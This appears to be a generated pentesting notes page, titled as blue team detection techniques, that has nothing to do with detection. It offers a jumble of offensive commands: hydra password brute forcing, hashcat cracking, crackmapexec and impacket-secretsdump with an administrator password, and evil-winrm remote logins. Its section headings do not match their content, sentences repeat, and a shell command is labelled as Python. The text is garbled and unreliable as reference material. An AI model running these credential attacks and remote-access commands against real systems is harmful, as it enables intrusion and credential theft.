---
TitleSEO: "Blue Team Detection Techniques | ZureFX"
TitlePost: "Blue Team Detection Techniques"
Author: "ZureFX"
Description: "Personal notes on Blue Team Detection Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "blue team, oscp, persistence, linux, windows, enumeration"
URL: "https://zurefx.github.io/notes/note-blue-team-detection-techniques-828.html"
URL_IMAGES: ""
Date: "2025-08-07"
Tags: "Blue Team, OSCP, Persistence, Linux, Windows, Enumeration"
Section: "notes"
Lang: "en"
main_img: "note-blue-team-detection-techniques-828"
Permalink: "/notes/note-blue-team-detection-techniques-828.html"
BtnLabel: "Read Notes"
Pick: 0
---
## SQL Injection

### MongoDB

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

```bash
nmap -sCV -p22,5432,1433 10.51.200.250 -oN scan.txt
```

## Laravel

### Silver Ticket

- `sharphound`
- `SeDebugPrivilege`
- `AS-REP Roasting`

```bash
gobuster dir -u http://10.64.171.59/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.64.220.119 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.47.110.104 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.106.5.102
nmap -sCV -p139,135,8443 10.106.129.88 -oN scan.txt
```

## PowerShell

### Telnet

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials.

Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials.

> **Note:** Unquoted Service Path was identified as the primary attack vector in this scenario.

```powershell
crackmapexec smb 10.86.227.93 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- `Remote Code Execution`
- `crackmapexec`
- `bloodhound`

## SMB

### Python

- `dcomexec`
- `chisel`
- `smbexec`
- `crackmapexec`
- `SSRF`
- `nikto`

The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

## .NET

### socat

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.19.166.222 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.53.69.9 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

## LAPS Abuse

### Nginx

- `secretsdump`
- `LAPS Abuse`
- `ffuf`
- `pwncat`
- `Path Traversal`
- `hashcat`

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.68.17.200
```

Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible.

```bash
evil-winrm -i 10.68.106.235 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

- `AlwaysInstallElevated`
- `smbexec`
- `socat`
- `Docker Escape`
